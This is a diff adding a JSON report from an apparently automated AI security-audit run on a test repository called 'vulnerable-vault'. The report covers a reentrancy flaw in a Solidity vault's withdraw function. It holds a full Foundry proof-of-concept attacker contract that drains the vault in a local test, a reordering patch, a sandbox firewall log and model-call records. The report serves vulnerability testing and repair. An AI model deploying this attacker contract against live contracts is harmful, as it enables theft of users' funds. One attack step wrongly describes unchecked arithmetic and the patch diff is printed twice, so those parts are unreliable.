@@ -1,0 +1,382 @@
+{
+  "run_id": "vulnerable-vault-8a3e99",
+  "repo": "fixtures/vulnerable-vault",
+  "provider": "nvidia",
+  "findings": [
+    {
+      "finding": {
+        "id": "F1",
+        "title": "Reentrancy in withdraw() allows draining the vault",
+        "severity": "critical",
+        "file": "src/Vault.sol",
+        "function": "withdraw",
+        "description": "The withdraw function performs the external call (msg.sender.call) before updating the user's balance. A malicious contract can re-enter withdraw() during the call, pass the balance check again, and withdraw repeatedly until the vault is empty.",
+        "attack": "1. Attacker deploys a contract with a fallback that calls vault.withdraw() again.\n2. Attacker deposits 1 ETH into the vault.\n3. Attacker calls withdraw(1 ETH).\n4. Vault checks balance (1 ETH >= 1 ETH), then sends 1 ETH to attacker's contract.\n5. Attacker's fallback triggers, calls withdraw(1 ETH) again.\n6. Vault balance check still passes (balance not yet decremented), sends another 1 ETH.\n7. Loop repeats until vault balance is exhausted.\n8. After the external calls return, the unchecked balance decrements execute but underflow is prevented by unchecked arithmetic, leaving balances corrupted.",
+        "confidence": 0.99
+      },
+      "citations": [
+        {
+          "title": "SC08:2026 Reentrancy Attacks - OWASP Smart Contract Security",
+          "url": "https://scs.owasp.org/sctop10/SC08-ReentrancyAttacks",
+          "snippet": "GMX V1 contracts were exploited via a classic yet sophisticated reentrancy vector in `executeDecreaseOrder`. The function accepted the attacker's smart contract address as a parameter; when it transferred control to that address during the refund process, the attacker re-entered and manipulated global average short prices, AUM, and GLP valuations. State updates after external calls and lack of ree"
+        },
+        {
+          "title": "Reentrancy Attack: Risks, Impact, And Prevention In Smart Contracts - Hacken",
+          "url": "https://hacken.io/discover/reentrancy-attacks",
+          "snippet": "A reentrancy attack is a type of vulnerability exploit where an attacker leverages an unsynchronized state during an external contract call. This allows for repeated execution of actions intended to occur only once, potentially resulting in unauthorized state alterations and actions, such as excessive fund withdrawals. [...] Here we see that withdraw function has a reentrancy vulnerability. Howeve"
+        },
+        {
+          "title": "How Hackers Drain Smart Contracts: The Reentrancy Attack That Stole $60M | by Ancilar | Blockchain Services | Medium",
+          "url": "https://medium.com/@ancilartech/how-hackers-drain-smart-contracts-the-reentrancy-attack-that-stole-60m-360ae43e88d1",
+          "snippet": "When the contract fails to update its state before sending funds, the attacker can continuously call the withdraw function to drain the contract\u2019s funds. A famous real-world Reentrancy attack is the DAO attack which caused a loss of 60 million US dollars.\n\n## How Does Reentrancy Attack Work?\n\nA reentrancy attack involves two smart contracts. A vulnerable contract and an untrusted attacker\u2019s contra"
+        },
+        {
+          "title": "Understanding Re-entrancy in Smart Contracts \u2013 SolidityScan Blogs",
+          "url": "https://blog.solidityscan.com/understanding-re-entrancy-in-smart-contracts-97cb67ecbb07",
+          "snippet": "The reentrancy technique may prove a huge vulnerability for your Solidity smart contracts. It transfers the control flow to an untrusted contract that intends to drain funds. Let us explore it in detail. [...] #### Example 1\n\n```\nfunction withdraw() external {  \n uint256 amount = balances[msg.sender];  \n require(msg.sender.call.value(amount)());  \n balances[msg.sender] = 0;  \n}\n```\n\nThe attacker e"
+        }
+      ],
+      "poc": {
+        "confirmed": true,
+        "attempts": 1,
+        "test_file": "test/Exploit_F1.t.sol",
+        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Vault.sol\";\n\ncontract ReentrancyAttacker {\n    address public immutable vault;\n    uint256 public immutable amount;\n\n    constructor(address _vault, uint256 _amount) {\n        vault = _vault;\n        amount = _amount;\n    }\n\n    function deposit() external payable {\n        Vault(vault).deposit{value: msg.value}();\n    }\n\n    receive() external payable {\n        // Re-enter withdraw while the vault still holds ETH. The vault does\n        // not decrement balances[msg.sender] until after the external call,\n        // so the balance check keeps passing.\n        if (address(vault).balance >= amount) {\n            Vault(vault).withdraw(amount);\n        }\n    }\n\n    function attack() external payable {\n        Vault(vault).withdraw(amount);\n    }\n\n    function sweep() external {\n        (bool ok,) = payable(msg.sender).call{value: address(this).balance}(\"\");\n        require(ok, \"sweep failed\");\n    }\n}\n\ncontract VaultTest is Test {\n    Vault public vault;\n    address public immutable attacker = address(0x1234);\n    address public immutable victim = address(0x5678);\n\n    function setUp() public {\n        vault = new Vault();\n    }\n\n    function test_exploit() public {\n        uint256 victimDeposit = 20 ether;\n        uint256 attackerDeposit = 1 ether;\n        uint256 amount = 1 ether;\n\n        // Fund the parties so they can deposit real ETH.\n        vm.deal(victim, victimDeposit);\n        vm.deal(attacker, attackerDeposit);\n\n        // Victim deposits into the vault.\n        vm.prank(victim);\n        vault.deposit{value: victimDeposit}();\n\n        // Deploy the attacker contract and fund it.\n        ReentrancyAttacker attackerContract = new ReentrancyAttacker(address(vault), amount);\n        vm.deal(address(attackerContract), attackerDeposit);\n\n        // Attacker contract deposits into the vault so balances[attackerContract] > 0.\n        vm.prank(address(attackerContract));\n        attackerContract.deposit{value: attackerDeposit}();\n\n        uint256 initialVaultAssets = vault.totalAssets();\n        assertEq(initialVaultAssets, victimDeposit + attackerDeposit);\n\n        // Initiate the reentrancy exploit.\n        vm.prank(address(attackerContract));\n        attackerContract.attack();\n\n        // The vault should be fully drained.\n        assertEq(vault.totalAssets(), 0);\n\n        // Attacker sweeps the drained funds to themselves.\n        vm.prank(attacker);\n        attackerContract.sweep();\n\n        // Concrete harm: attacker ends with far more than the 1 ETH they deposited.\n        assertGt(attacker.balance, attackerDeposit);\n    }\n}",
+        "output": "[PASS] VaultTest.test_exploit()",
+        "note": ""
+      },
+      "patch": {
+        "applied": true,
+        "attempts": 1,
+        "diff": "--- a/src/Vault.sol\n+++ b/src/Vault.sol\n@@ -11,14 +11,14 @@\n \n     function withdraw(uint256 amount) external {\n         require(balances[msg.sender] >= amount, \"insufficient\");\n-        (bool ok,) = msg.sender.call{value: amount}(\"\");\n-        require(ok, \"transfer failed\");\n         unchecked {\n             balances[msg.sender] -= amount;\n         }\n+        (bool ok,) = msg.sender.call{value: amount}(\"\");\n+        require(ok, \"transfer failed\");\n     }\n \n     function totalAssets() external view returns (uint256) {\n         return address(this).balance;\n     }\n-}\n+}\n--- a/src/Vault.sol\n+++ b/src/Vault.sol\n@@ -11,14 +11,14 @@\n \n     function withdraw(uint256 amount) external {\n         require(balances[msg.sender] >= amount, \"insufficient\");\n-        (bool ok,) = msg.sender.call{value: amount}(\"\");\n-        require(ok, \"transfer failed\");\n         unchecked {\n             balances[msg.sender] -= amount;\n         }\n+        (bool ok,) = msg.sender.call{value: amount}(\"\");\n+        require(ok, \"transfer failed\");\n     }\n \n     function totalAssets() external view returns (uint256) {\n         return address(this).balance;\n     }\n-}\n+}",
+        "poc_blocked": true,
+        "suite_green": true,
+        "output": "{\"test/Vault.t.sol:VaultTest\":{\"duration\":\"30ms 398\u00b5s 790ns\",\"test_results\":{\"test_CannotOverdraw()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":86944}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"5ms 382\u00b5s 674ns\",\"breakpoints\":{},\"gas_snapshots\":{}},\"test_DepositWithdraw()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":112679}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"1ms 571\u00b5s 232ns\",\"breakpoints\":{},\"gas_snapshots\":{}}},\"warnings\":[]}}\n",
+        "note": "Reordered withdraw() to follow checks-effects-interactions: the user's balance is decremented before the external call, so a re-entrant withdraw() will fail the balance check and revert instead of draining the vault."
+      },
+      "status": "confirmed"
+    }
+  ],
+  "quarantined": [],
+  "quarantine_files": {},
+  "firewall_log": [
+    {
+      "ts": 1793264274.987962,
+      "kind": "shell",
+      "action": "forge test",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "allowlist",
+      "reason": "forge allowed",
+      "confidence": 1.0,
+      "latency_ms": 0.1,
+      "provider": ""
+    },
+    {
+      "ts": 1793264280.8311813,
+      "kind": "read",
+      "action": "README.md",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "read-ok",
+      "reason": "read inside jail",
+      "confidence": 1.0,
+      "latency_ms": 4.74,
+      "provider": ""
+    },
+    {
+      "ts": 1793264285.9127421,
+      "kind": "read",
+      "action": "foundry.toml",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "read-ok",
+      "reason": "read inside jail",
+      "confidence": 1.0,
+      "latency_ms": 18.71,
+      "provider": ""
+    },
+    {
+      "ts": 1793264286.348144,
+      "kind": "read",
+      "action": "src/Vault.sol",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "read-ok",
+      "reason": "read inside jail",
+      "confidence": 1.0,
+      "latency_ms": 1.37,
+      "provider": ""
+    },
+    {
+      "ts": 1793264287.886936,
+      "kind": "read",
+      "action": "test/Vault.t.sol",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "read-ok",
+      "reason": "read inside jail",
+      "confidence": 1.0,
+      "latency_ms": 0.62,
+      "provider": ""
+    },
+    {
+      "ts": 1793264552.137999,
+      "kind": "net",
+      "action": "https://api.tavily.com/search",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "net-allowlist",
+      "reason": "api.tavily.com allowlisted",
+      "confidence": 1.0,
+      "latency_ms": 8.36,
+      "provider": ""
+    },
+    {
+      "ts": 1793264552.7149556,
+      "kind": "net",
+      "action": "https://api.tavily.com/search",
+      "verdict": "allow",
+      "layer": "L2",
+      "rule": "nemotron-policy",
+      "reason": "Web search for public exploit write-ups via Tavily is an allowed part of the web research stage.",
+      "confidence": 1.0,
+      "latency_ms": 563.34,
+      "provider": "nvidia"
+    },
+    {
+      "ts": 1793264682.3955438,
+      "kind": "write",
+      "action": "test/Exploit_F1.t.sol (2678B)",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "write-ok",
+      "reason": "write inside jail",
+      "confidence": 1.0,
+      "latency_ms": 60.0,
+      "provider": ""
+    },
+    {
+      "ts": 1793264682.4273767,
+      "kind": "shell",
+      "action": "forge test --match-path test/Exploit_F1.t.sol --match-test test_exploit",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "allowlist",
+      "reason": "forge allowed",
+      "confidence": 1.0,
+      "latency_ms": 3.8,
+      "provider": ""
+    },
+    {
+      "ts": 1793264696.7326226,
+      "kind": "read",
+      "action": "src/Vault.sol",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "read-ok",
+      "reason": "read inside jail",
+      "confidence": 1.0,
+      "latency_ms": 23.13,
+      "provider": ""
+    },
+    {
+      "ts": 1793264712.0900054,
+      "kind": "write",
+      "action": "src/Vault.sol (651B)",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "write-ok",
+      "reason": "write inside jail",
+      "confidence": 1.0,
+      "latency_ms": 37.18,
+      "provider": ""
+    },
+    {
+      "ts": 1793264712.1240845,
+      "kind": "write",
+      "action": "src/Vault.sol (651B)",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "write-ok",
+      "reason": "write inside jail",
+      "confidence": 1.0,
+      "latency_ms": 0.21,
+      "provider": ""
+    },
+    {
+      "ts": 1793264712.1373367,
+      "kind": "shell",
+      "action": "forge test --match-path test/Exploit_F1.t.sol",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "allowlist",
+      "reason": "forge allowed",
+      "confidence": 1.0,
+      "latency_ms": 10.51,
+      "provider": ""
+    },
+    {
+      "ts": 1793264728.8861854,
+      "kind": "shell",
+      "action": "forge test --no-match-path test/Exploit_F1.t.sol",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "allowlist",
+      "reason": "forge allowed",
+      "confidence": 1.0,
+      "latency_ms": 31.67,
+      "provider": ""
+    },
+    {
+      "ts": 1793264737.7103171,
+      "kind": "write",
+      "action": "src/Vault.sol (652B)",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "write-ok",
+      "reason": "write inside jail",
+      "confidence": 1.0,
+      "latency_ms": 25.99,
+      "provider": ""
+    }
+  ],
+  "calls": [
+    {
+      "provider": "nvidia",
+      "model": "nvidia/nemotron-3.5-lightning-30b-a3b",
+      "role": "scanner",
+      "prompt_tokens": 314,
+      "completion_tokens": 16,
+      "latency_s": 4.987729197368026
+    },
+    {
+      "provider": "nvidia",
+      "model": "nvidia/nemotron-3.5-lightning-30b-a3b",
+      "role": "scanner",
+      "prompt_tokens": 343,
+      "completion_tokens": 16,
+      "latency_s": 0.40694166626781225
+    },
+    {
+      "provider": "nvidia",
+      "model": "nvidia/nemotron-3.5-lightning-30b-a3b",
+      "role": "scanner",
+      "prompt_tokens": 531,
+      "completion_tokens": 16,
+      "latency_s": 0.231823923997581
+    },
+    {
+      "provider": "nvidia",
+      "model": "nvidia/nemotron-3.5-lightning-30b-a3b",
+      "role": "scanner",
+      "prompt_tokens": 642,
+      "completion_tokens": 15,
+      "latency_s": 0.2166677312925458
+    },
+    {
+      "provider": "nvidia",
+      "model": "nvidia/nemotron-3.5-super-vl-120b-a12b",
+      "role": "recon",
+      "prompt_tokens": 742,
+      "completion_tokens": 6000,
+      "latency_s": 45.6105215344578
+    },
+    {
+      "provider": "nvidia",
+      "model": "nvidia/nemotron-3.5-super-vl-120b-a12b",
+      "role": "recon",
+      "prompt_tokens": 784,
+      "completion_tokens": 6000,
+      "latency_s": 63.28576493822038
+    },
+    {
+      "provider": "nvidia",
+      "model": "nvidia/nemotron-3.5-super-vl-120b-a12b",
+      "role": "recon",
+      "prompt_tokens": 826,
+      "completion_tokens": 6000,
+      "latency_s": 115.24247135035694
+    },
+    {
+      "provider": "nvidia",
+      "model": "nvidia/nemotron-3-ultra-550b-a55b",
+      "role": "recon-fallback",
+      "prompt_tokens": 742,
+      "completion_tokens": 888,
+      "latency_s": 36.64409021101892
+    },
+    {
+      "provider": "nvidia",
+      "model": "nvidia/nemotron-3.5-lightning-30b-a3b",
+      "role": "policy",
+      "prompt_tokens": 316,
+      "completion_tokens": 41,
+      "latency_s": 0.5586385866627097
+    },
+    {
+      "provider": "nvidia",
+      "model": "nvidia/nemotron-3.5-lightning-30b-a3b",
+      "role": "scanner",
+      "prompt_tokens": 377,
+      "completion_tokens": 16,
+      "latency_s": 0.6638729562982917
+    },
+    {
+      "provider": "nvidia",
+      "model": "nvidia/nemotron-3.5-lightning-30b-a3b",
+      "role": "scanner",
+      "prompt_tokens": 517,
+      "completion_tokens": 30,
+      "latency_s": 0.45460997242480516
+    },
+    {
+      "provider": "nvidia",
+      "model": "nvidia/nemotron-3.5-lightning-30b-a3b",
+      "role": "scanner",
+      "prompt_tokens": 533,
+      "completion_tokens": 72,
+      "latency_s": 1.091273557394743
+    },
+    {
+      "provider": "nvidia",
+      "model": "nvidia/nemotron-3.5-lightning-30b-a3b",
+      "role": "scanner",
+      "prompt_tokens": 616,
+      "completion_tokens": 33,
+      "latency_s": 0.6484814248979092
+    },
+    {
+      "provider": "nvidia",
+      "model": "nvidia/nemotron-3.5-super-vl-120b-a12b",
+      "role": "exploit",
+      "prompt_tokens": 758,
+      "completion_tokens": 13023,
+      "latency_s": 119.91252851858735
+    },
+    {
+      "provider": "nvidia",
+      "model": "nvidia/nemotron-3.5-super-vl-120b-a12b",
+      "role": "patch",
+      "prompt_tokens": 1270,
+      "completion_tokens": 1010,
+      "latency_s": 7.7272834572941065
+    },
+    {
+      "provider": "nvidia",
+      "model": "nvidia/nemotron-3.5-super-vl-120b-a12b",
+      "role": "patch",
+      "prompt_tokens": 1573,
+      "completion_tokens": 1087,
+      "latency_s": 7.522716545499861
+    }
+  ],
+  "baseline_green": true,
+  "elapsed_s": 462.8825976662338,
+  "out_dir": "/root/redline/jobs/vulnerable-vault-8a3e99",
+  "scripted": false,
+  "label": "",
+  "models": {
+    "main": "nvidia/nemotron-3.5-super-vl-120b-a12b",
+    "firewall": "nvidia/nemotron-3.5-lightning-30b-a3b"
+  }
+}
